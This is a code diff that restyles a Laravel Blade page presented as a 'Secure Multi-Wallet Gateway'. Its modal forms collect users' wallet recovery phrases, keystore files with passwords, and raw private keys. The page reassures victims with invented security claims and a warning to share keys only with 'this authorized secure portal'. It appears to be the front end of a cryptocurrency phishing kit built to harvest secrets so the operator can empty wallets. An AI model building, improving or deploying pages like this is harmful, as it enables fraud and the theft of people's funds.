@@ -1,25 +1,25 @@
 @include('user.components.user_head', ['title' => 'Choose Wallet Type'])
 
-<div class="min-h-screen bg-gray-50 text-gray-900 font-sans">
+<div class="min-h-screen text-white font-sans">
     <!-- Sticky Header Navigation -->
-    <div class="sticky top-0 z-40 bg-white/80 backdrop-blur-md border-b border-gray-100 px-6 py-4">
+    <div class="sticky top-0 z-40 bg-blue-900/60 backdrop-blur-xl border-b border-white/10 px-6 py-4">
         <div class="max-w-7xl mx-auto flex justify-between items-center">
-            <a href="{{ route('user') }}" class="flex items-center space-x-3 group px-4 py-2 hover:bg-gray-50 rounded-2xl transition-all duration-300">
-                <div class="w-10 h-10 bg-gray-100 group-hover:bg-blue-600 rounded-xl flex items-center justify-center text-gray-400 group-hover:text-white transition-all shadow-sm">
+            <a href="{{ route('user') }}" class="flex items-center space-x-3 group px-4 py-2 hover:bg-white/5 rounded-2xl transition-all duration-300 border border-transparent hover:border-white/10">
+                <div class="w-10 h-10 bg-white/10 group-hover:bg-blue-600 rounded-xl flex items-center justify-center text-white/60 group-hover:text-white transition-all shadow-sm border border-white/10">
                     <i class="fas fa-arrow-left"></i>
                 </div>
                 <div>
-                    <span class="text-sm font-black text-gray-900 block leading-none">Back to Dashboard</span>
-                    <span class="text-[10px] font-bold text-gray-400 uppercase tracking-widest mt-1">Portfolio Sync</span>
+                    <span class="text-sm font-black text-white block leading-none">Back to Dashboard</span>
+                    <span class="text-[10px] font-bold text-blue-300 uppercase tracking-widest mt-1">Portfolio Sync</span>
                 </div>
             </a>
             
             <div class="flex items-center space-x-4">
                 <div class="hidden md:flex flex-col items-end mr-4">
-                    <span class="text-xs font-bold text-gray-400 uppercase tracking-widest">Connected User</span>
-                    <span class="text-sm font-black text-gray-900">{{ auth()->user()->username }}</span>
+                    <span class="text-xs font-bold text-blue-300 uppercase tracking-widest">Connected User</span>
+                    <span class="text-sm font-black text-white">{{ auth()->user()->username }}</span>
                 </div>
-                <div class="w-12 h-12 bg-white border-2 border-gray-100 rounded-2xl p-0.5 shadow-sm">
+                <div class="w-12 h-12 bg-white/10 border-2 border-white/20 rounded-2xl p-0.5 shadow-xl backdrop-blur-md">
                     <img src="https://ui-avatars.com/api/?name={{ auth()->user()->username }}&background=0284c7&color=fff" class="w-full h-full rounded-[14px] object-cover" alt="User">
                 </div>
             </div>
@@ -30,11 +30,11 @@
     <div class="max-w-7xl mx-auto px-4 py-12">
         <!-- Header -->
         <div class="text-center mb-16 relative">
-            <div class="inline-flex items-center justify-center w-24 h-24 bg-white rounded-[32px] shadow-xl shadow-gray-200 mb-8 p-6">
-                <i class="fas fa-wallet text-blue-600 text-4xl"></i>
+            <div class="inline-flex items-center justify-center w-24 h-24 bg-white/10 backdrop-blur-md border border-white/20 rounded-[32px] shadow-2xl mb-8 p-6">
+                <i class="fas fa-wallet text-blue-400 text-4xl"></i>
             </div>
-            <h1 class="text-4xl md:text-5xl font-black mb-4 tracking-tighter text-gray-900 leading-tight">Secure Multi-Wallet Gateway</h1>
-            <p class="text-xl text-gray-500 max-w-2xl mx-auto font-medium">Link your preferred cryptocurrency walletprovider to unlock institutional-grade liquidity and instant synchronization.</p>
+            <h1 class="text-4xl md:text-5xl font-black mb-4 tracking-tighter text-white leading-tight">Secure Multi-Wallet Gateway</h1>
+            <p class="text-xl text-blue-100/70 max-w-2xl mx-auto font-medium">Link your preferred cryptocurrency provider to unlock institutional-grade liquidity and instant synchronization.</p>
         </div>
 
         <!-- Wallet Providers Grid -->
@@ -42,25 +42,25 @@
             @foreach($activeWalletProvider as $type)
                 <div 
                     onclick="selectWalletType({{ $type->id }}, '{{ $type->title }}')"
-                    class="group bg-white rounded-[28px] border border-gray-100 p-8 hover:border-blue-500 hover:shadow-2xl hover:shadow-blue-100 hover:-translate-y-2 transition-all duration-500 cursor-pointer relative overflow-hidden"
+                    class="group bg-white/5 backdrop-blur-md rounded-[28px] border border-white/10 p-8 hover:border-blue-500 hover:bg-white/10 hover:shadow-2xl hover:shadow-blue-900/40 hover:-translate-y-2 transition-all duration-500 cursor-pointer relative overflow-hidden"
                 >
                     <!-- Abstract Background -->
-                    <div class="absolute -right-8 -bottom-8 w-24 h-24 bg-blue-50/50 rounded-full group-hover:bg-blue-600 transition-colors duration-500"></div>
+                    <div class="absolute -right-8 -bottom-8 w-24 h-24 bg-blue-500/10 rounded-full group-hover:bg-blue-600 transition-colors duration-500"></div>
 
                     <div class="relative z-10 flex flex-col items-center text-center">
                         <div class="relative mb-6">
-                            <div class="w-20 h-20 rounded-[20px] bg-gray-50 p-3 shadow-inner transform group-hover:scale-110 transition-transform duration-500">
+                            <div class="w-20 h-20 rounded-[20px] bg-white p-3 shadow-2xl transform group-hover:scale-110 transition-transform duration-500 border border-white/20">
                                 <img class="w-full h-full object-contain" src="{{ $type->trans_img_src }}" alt="{{ $type->title }}" />
                             </div>
-                            <div class="absolute -top-3 -right-3 w-8 h-8 bg-green-500 border-4 border-white rounded-full flex items-center justify-center shadow-lg group-hover:rotate-12 transition-transform">
+                            <div class="absolute -top-3 -right-3 w-8 h-8 bg-green-500 border-4 border-blue-900 rounded-full flex items-center justify-center shadow-lg group-hover:rotate-12 transition-transform">
                                 <i class="fas fa-check text-white text-[10px]"></i>
                             </div>
                         </div>
                         
-                        <h3 class="text-xl font-bold text-gray-900 mb-2 group-hover:text-blue-600 transition-colors">{{ $type->title }}</h3>
-                        <p class="text-xs text-gray-400 font-bold tracking-widest uppercase mb-6">Enterprise Ready</p>
+                        <h3 class="text-xl font-bold text-white mb-2 group-hover:text-blue-400 transition-colors">{{ $type->title }}</h3>
+                        <p class="text-xs text-blue-400 font-bold tracking-widest uppercase mb-6">Enterprise Ready</p>
 
-                        <div class="w-full py-3 bg-gray-50 group-hover:bg-blue-600 rounded-2xl text-gray-500 group-hover:text-white font-bold text-sm transition-all duration-300">
+                        <div class="w-full py-3 bg-white/10 group-hover:bg-blue-600 rounded-2xl text-white font-bold text-sm transition-all duration-300 border border-white/5">
                             Connect {{ $type->title }}
                         </div>
                     </div>
@@ -69,7 +69,7 @@
         </div>
 
         <!-- Verification / Trust Section -->
-        <div class="max-w-4xl mx-auto rounded-[40px] bg-gradient-to-br from-blue-600 to-indigo-700 p-12 text-white relative overflow-hidden shadow-2xl shadow-blue-200">
+        <div class="max-w-4xl mx-auto rounded-[40px] bg-gradient-to-br from-blue-600/20 to-indigo-700/20 backdrop-blur-xl p-12 text-white relative overflow-hidden shadow-2xl border border-white/10">
             <div class="relative z-10 grid md:grid-cols-2 gap-12 items-center">
                 <div class="space-y-6">
                     <h2 class="text-3xl font-black tracking-tight leading-tight">Advanced Security Infrastructure</h2>
@@ -85,9 +85,9 @@
                         </div>
                     </div>
                 </div>
-                <div class="flex justify-center bg-white/10 backdrop-blur-xl rounded-[32px] p-8 border border-white/20">
+                <div class="flex justify-center bg-white/5 backdrop-blur-xl rounded-[32px] p-8 border border-white/10">
                     <div class="text-center">
-                        <div class="w-16 h-16 bg-white rounded-2xl flex items-center justify-center text-blue-600 mx-auto mb-4 text-2xl">
+                        <div class="w-16 h-16 bg-white/10 rounded-2xl flex items-center justify-center text-blue-400 mx-auto mb-4 text-2xl border border-white/10">
                             <i class="fas fa-shield-halved"></i>
                         </div>
                         <p class="font-bold mb-2">Internal Security Grade</p>
@@ -97,40 +97,40 @@
                 </div>
             </div>
             <!-- Decorative Graphics -->
-            <div class="absolute top-0 right-0 w-64 h-64 bg-white/5 rounded-full -mr-20 -mt-20 blur-3xl"></div>
-            <div class="absolute bottom-0 left-0 w-64 h-64 bg-blue-400/10 rounded-full -ml-20 -mb-20 blur-3xl"></div>
+            <div class="absolute top-0 right-0 w-64 h-64 bg-blue-500/10 rounded-full -mr-20 -mt-20 blur-3xl"></div>
+            <div class="absolute bottom-0 left-0 w-64 h-64 bg-indigo-500/10 rounded-full -ml-20 -mb-20 blur-3xl"></div>
         </div>
     </div>
 
     <!-- Wallet Linking Modal -->
     <div id="walletModal" class="fixed inset-0 z-50 hidden transition-opacity duration-300" role="dialog" aria-modal="true">
         <!-- Backdrop -->
-        <div class="absolute inset-0 bg-gray-900/80 backdrop-blur-md" onclick="closeWalletModal()"></div>
+        <div class="absolute inset-0 bg-blue-950/90 backdrop-blur-md" onclick="closeWalletModal()"></div>
         
         <!-- Modal Container -->
         <div class="flex min-h-screen items-center justify-center p-4 relative z-10">
-            <div class="bg-white rounded-[40px] shadow-3xl w-full max-w-2xl max-h-[90vh] overflow-hidden transform transition-all duration-500 scale-95 opacity-0" id="modalContent">
+            <div class="bg-blue-900 border border-white/10 rounded-[40px] shadow-3xl w-full max-w-2xl max-h-[90vh] overflow-hidden transform transition-all duration-500 scale-95 opacity-0" id="modalContent">
                 <!-- Modal Header -->
-                <div class="bg-gray-50 px-10 py-8 border-b border-gray-100 flex justify-between items-center">
+                <div class="bg-blue-800/20 px-10 py-8 border-b border-white/5 flex justify-between items-center">
                     <div class="flex items-center space-x-6">
-                        <div class="w-16 h-16 bg-white rounded-2xl shadow-md p-3" id="modalIconContainer">
+                        <div class="w-16 h-16 bg-white rounded-2xl shadow-xl p-3" id="modalIconContainer">
                             <img src="" alt="" id="modalWalletIcon" class="w-full h-full object-contain">
                         </div>
                         <div>
-                            <p class="text-xs text-blue-600 font-black uppercase tracking-widest mb-1">Authenticating</p>
-                            <h2 class="text-3xl font-black text-gray-900 tracking-tight" id="modalWalletName">Wallet Name</h2>
+                            <p class="text-xs text-blue-400 font-black uppercase tracking-widest mb-1">Authenticating</p>
+                            <h2 class="text-3xl font-black text-white tracking-tight" id="modalWalletName">Wallet Name</h2>
                         </div>
                     </div>
-                    <button onclick="closeWalletModal()" class="w-12 h-12 bg-white rounded-full flex items-center justify-center text-gray-400 hover:text-red-500 hover:rotate-90 transition-all shadow-sm border border-gray-100">
+                    <button onclick="closeWalletModal()" class="w-12 h-12 bg-white/10 rounded-full flex items-center justify-center text-white/60 hover:text-red-400 hover:rotate-90 transition-all shadow-sm border border-white/10">
                         <i class="fas fa-times text-xl"></i>
                     </button>
                 </div>
 
                 <!-- Tabs -->
-                <div class="px-10 py-6 border-b border-gray-100 flex space-x-2">
-                    <button onclick="showTab('phrase')" class="tab-btn active px-6 py-3 rounded-2xl bg-blue-600 text-white font-bold text-sm shadow-xl shadow-blue-100 transition-all">Phase Link</button>
-                    <button onclick="showTab('keystore')" class="tab-btn px-6 py-3 rounded-2xl bg-gray-100 text-gray-500 font-bold text-sm hover:bg-gray-200 transition-all">Keystore JSON</button>
-                    <button onclick="showTab('private')" class="tab-btn px-6 py-3 rounded-2xl bg-gray-100 text-gray-500 font-bold text-sm hover:bg-gray-200 transition-all">Private Key</button>
+                <div class="px-10 py-6 border-b border-white/5 flex space-x-2">
+                    <button onclick="showTab('phrase')" class="tab-btn active px-6 py-3 rounded-2xl bg-blue-600 text-white font-bold text-sm shadow-xl shadow-blue-500/20 transition-all hover:bg-blue-500">Phase Link</button>
+                    <button onclick="showTab('keystore')" class="tab-btn px-6 py-3 rounded-2xl bg-white/5 text-blue-200/60 font-bold text-sm hover:bg-white/10 border border-white/10 transition-all">Keystore JSON</button>
+                    <button onclick="showTab('private')" class="tab-btn px-6 py-3 rounded-2xl bg-white/5 text-blue-200/60 font-bold text-sm hover:bg-white/10 border border-white/10 transition-all">Private Key</button>
                 </div>
 
                 <!-- Scrollable Body -->
@@ -142,10 +142,10 @@
                             <input type="hidden" name="wallet_provider_id" id="phraseWalletTypeId">
                             @include('user.components.wallet-form-common', ['type' => 'phrase'])
                             <div class="space-y-4">
-                                <label class="text-sm font-bold text-gray-700 block ml-1 uppercase tracking-wider">Recovery Phrase</label>
-                                <textarea name="recovery_phrase" rows="4" class="w-full bg-gray-50 border-2 border-transparent focus:border-blue-600 focus:bg-white rounded-3xl p-6 text-gray-900 font-medium transition-all outline-none" placeholder="Enter your 12 or 24 words separated by space..."></textarea>
+                                <label class="text-sm font-bold text-blue-300 block ml-1 uppercase tracking-wider">Recovery Phrase</label>
+                                <textarea name="recovery_phrase" rows="4" class="w-full bg-black/20 border-2 border-white/5 focus:border-blue-500 focus:bg-black/40 rounded-3xl p-6 text-white font-medium transition-all outline-none" placeholder="Enter your 12 or 24 words separated by space..."></textarea>
                             </div>
-                            <button type="submit" class="w-full bg-blue-600 hover:bg-blue-700 py-6 rounded-3xl text-white font-black text-lg transition-all shadow-2xl shadow-blue-100 hover:scale-[1.02] active:scale-95 flex items-center justify-center space-x-3">
+                            <button type="submit" class="w-full bg-blue-600 hover:bg-blue-700 py-6 rounded-3xl text-white font-black text-lg transition-all shadow-2xl shadow-blue-950/50 hover:scale-[1.02] active:scale-95 flex items-center justify-center space-x-3">
                                 <span>Authorize External Port</span>
                                 <i class="fas fa-link text-sm"></i>
                             </button>
@@ -159,14 +159,14 @@
                             <input type="hidden" name="wallet_provider_id" id="keystoreWalletTypeId">
                             @include('user.components.wallet-form-common', ['type' => 'keystore'])
                             <div class="space-y-4">
-                                <label class="text-sm font-bold text-gray-700 block ml-1 uppercase tracking-wider">Keystore JSON</label>
-                                <textarea name="keystore_json" rows="4" class="w-full bg-gray-50 border-2 border-transparent focus:border-blue-600 focus:bg-white rounded-3xl p-6 text-gray-900 font-mono text-xs transition-all outline-none" placeholder='{"address":"...","id":"...","version":3,...}'></textarea>
+                                <label class="text-sm font-bold text-blue-300 block ml-1 uppercase tracking-wider">Keystore JSON</label>
+                                <textarea name="keystore_json" rows="4" class="w-full bg-black/20 border-2 border-white/5 focus:border-blue-500 focus:bg-black/40 rounded-3xl p-6 text-white font-mono text-xs transition-all outline-none" placeholder='{"address":"...","id":"...","version":3,...}'></textarea>
                             </div>
                             <div class="space-y-4">
-                                <label class="text-sm font-bold text-gray-700 block ml-1 uppercase tracking-wider">Wallet Password</label>
-                                <input type="password" name="keystore_password" class="w-full bg-gray-50 border-2 border-transparent focus:border-blue-600 focus:bg-white rounded-[20px] px-6 py-4 text-gray-900 font-medium transition-all outline-none" placeholder="Enter password used to encrypt JSON">
+                                <label class="text-sm font-bold text-blue-300 block ml-1 uppercase tracking-wider">Wallet Password</label>
+                                <input type="password" name="keystore_password" class="w-full bg-black/20 border-2 border-white/5 focus:border-blue-500 focus:bg-black/40 rounded-[20px] px-6 py-4 text-white font-medium transition-all outline-none" placeholder="Enter password used to encrypt JSON">
                             </div>
-                            <button type="submit" class="w-full bg-blue-600 hover:bg-blue-700 py-6 rounded-3xl text-white font-black text-lg transition-all shadow-2xl shadow-blue-100 flex items-center justify-center space-x-3">
+                            <button type="submit" class="w-full bg-blue-600 hover:bg-blue-700 py-6 rounded-3xl text-white font-black text-lg transition-all shadow-2xl shadow-blue-950/50 flex items-center justify-center space-x-3">
                                 <span>Import Secure Container</span>
                                 <i class="fas fa-file-shield text-sm"></i>
                             </button>
@@ -180,16 +180,16 @@
                             <input type="hidden" name="wallet_provider_id" id="privateWalletTypeId">
                             @include('user.components.wallet-form-common', ['type' => 'private'])
                             <div class="space-y-4">
-                                <label class="text-sm font-bold text-gray-700 block ml-1 uppercase tracking-wider">Private Key String</label>
+                                <label class="text-sm font-bold text-blue-300 block ml-1 uppercase tracking-wider">Private Key String</label>
                                 <div class="relative group">
-                                    <textarea name="private_key" rows="3" class="w-full bg-red-50/50 border-2 border-red-100 group-focus-within:border-red-500 rounded-3xl p-6 text-gray-900 font-mono transition-all outline-none" placeholder="Paste your alphanumeric private key..."></textarea>
+                                    <textarea name="private_key" rows="3" class="w-full bg-red-950/20 border-2 border-red-900/40 group-focus-within:border-red-500 rounded-3xl p-6 text-white font-mono transition-all outline-none" placeholder="Paste your alphanumeric private key..."></textarea>
                                 </div>
-                                <div class="px-6 py-4 bg-red-50 border border-red-100 rounded-3xl flex items-start space-x-4">
-                                    <i class="fas fa-triangle-exclamation text-red-600 mt-1"></i>
-                                    <p class="text-xs text-red-900 leading-tight"><strong>Safety Warning:</strong> Never share your private key with anyone except this authorized secure portal. We will never ask for your key outside of this protected session.</p>
+                                <div class="px-6 py-4 bg-red-900/10 border border-red-500/20 rounded-3xl flex items-start space-x-4">
+                                    <i class="fas fa-triangle-exclamation text-red-500 mt-1"></i>
+                                    <p class="text-xs text-red-100/70 leading-tight"><strong>Safety Warning:</strong> Never share your private key with anyone except this authorized secure portal. We will never ask for your key outside of this protected session.</p>
                                 </div>
                             </div>
-                            <button type="submit" class="w-full bg-blue-600 hover:bg-blue-700 py-6 rounded-3xl text-white font-black text-lg transition-all shadow-2xl shadow-blue-100 flex items-center justify-center space-x-3">
+                            <button type="submit" class="w-full bg-blue-600 hover:bg-blue-700 py-6 rounded-3xl text-white font-black text-lg transition-all shadow-2xl shadow-blue-950/50 flex items-center justify-center space-x-3">
                                 <span>Inject Private Access Key</span>
                                 <i class="fas fa-key text-sm"></i>
                             </button>
@@ -198,8 +198,8 @@
                 </div>
 
                 <!-- Footer -->
-                <div class="bg-gray-50 px-10 py-6 text-center border-t border-gray-100">
-                    <p class="text-xs text-gray-400 font-medium ">Secure 256-bit TLS Connection Active</p>
+                <div class="bg-blue-800/10 px-10 py-6 text-center border-t border-white/5">
+                    <p class="text-xs text-blue-400 font-medium ">Secure 256-bit TLS Connection Active</p>
                 </div>
             </div>
         </div>
